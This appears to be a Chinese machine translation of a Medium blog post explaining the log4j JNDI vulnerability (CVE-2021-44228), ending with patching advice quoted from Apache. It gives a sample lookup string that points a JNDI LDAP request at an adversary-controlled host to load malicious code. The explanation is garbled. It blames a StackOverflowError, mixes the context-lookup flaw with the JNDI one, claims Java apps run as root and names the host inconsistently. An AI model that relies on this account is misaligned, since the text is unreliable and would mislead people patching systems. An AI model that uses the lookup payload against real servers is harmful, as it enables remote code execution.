# Apache log4j 漏洞

> 原文：<https://medium.com/nerd-for-tech/apache-log4j-vulnerability-67d00ad56270?source=collection_archive---------3----------------------->

下面的文章假设读者对 Apache log4j 库有一些基本的了解。

这是用于伐木的最著名的阿帕奇图书馆之一。log4j 漏洞已经席卷全球。企业竞相修补 log4j 版本。让我们讨论一下这个问题。

# 什么和如何

在 10000 英尺上，问题与 StackOverflowError 有关。这个问题与一个叫做 **JNDI 和变量外推**的特定功能有关。只有带有上下文查找的**模式布局(例如，$${ctx:loginId})** 容易受到这种攻击。

首先，JNDI 指的是 Java 命名和目录接口，它是一个 API，为使用 Java 编程语言的应用程序提供命名和目录功能。
另一个概念变量外推指的是在运行时如何解析变量的值。

log4j 在日志语句中使用变量外推法来解析变量的值。例如

> **log.debug("这是要揭露的漏洞编号:${vNo}"**

实际记录的语句应该是

> **22/12/2021 13:20 调试这是为了揭露漏洞编号:CVE-2021–44228**

> 现在 JNDI 查找的作用来了。在通过虚拟机或容器部署的企业中，JAVA 应用程序以 root 权限运行。使用 root 权限和 JNDI 尝试在文件系统中递归搜索变量或远程查找，如果变量被修改为错误的值，那么它可以访问文件系统中应受保护的值。

说到这里，我提到了带有上下文查找的**模式布局会出现这个问题(例如，$${ctx:loginId})。** 这里的意思是:**布局**是一种格式，日志事件需要以这种格式形成，以便与消费者处理事件兼容。**模式布局**是一种布局，其中日志语句基于为 log4j 配置的转换字符串。

# 样品

让我们看前面的例子

> **log.debug("这是揭露漏洞号:${vNo}"**

现在，假设我们的应用程序可以控制变量的值。假设 **vNo** 的值来自**jndi:LDAP://my-server . com/getVno**
log4j 将获取该值，并将执行 JNDI 查找来获取该值。假设这个 my-service.com 被对手控制了。现在这个域可以被修改下载一些恶意代码。

# 严重

这被评为**中度**漏洞，后来升级为**严重**。利用此漏洞可以攻击的类型有
1。LCE -本地代码执行
2。RCE -远程代码执行

有一个标准的漏洞评分机制，称为 CVSS 或通用漏洞评分系统。log4j 漏洞的得分为**10/10**，这是最高形式的漏洞。

# 受影响的版本

log4j 2 的所有版本都会受到影响。

# 减轻

[(来自阿帕奇 doc)](https://logging.apache.org/log4j/2.x/security.html)

*   升级到 Log4j 2.3.1(适用于 Java 6)、2.12.3(适用于 Java 7)或 2.17.0(适用于 Java 8 及更高版本)。
*   否则，在 2.16.0 以外的任何版本中，您都可以从类路径中删除 JndiLookup 类:zip -q -d log4j-core-*。jar org/Apache/logging/Log4j/core/lookup/jndilookup . class
    升级到 Log4j 2.3.1(针对 Java 6)、2.12.3(针对 Java 7)或 2.17.0(针对 Java 8 及更高版本)。
    从 2.17.0 版本开始，(以及 Java 7 和 Java 6 的 2.12.3 和 2.3.1)，只递归展开配置中的查找字符串；在任何其他用法中，只解析顶级查找，而不解析任何嵌套查找。

就是这样。因为这个问题的影响是广泛的，所以我想写一篇关于这个话题的文章。希望这些细节能对你有所帮助，如果有任何出入，请告诉我。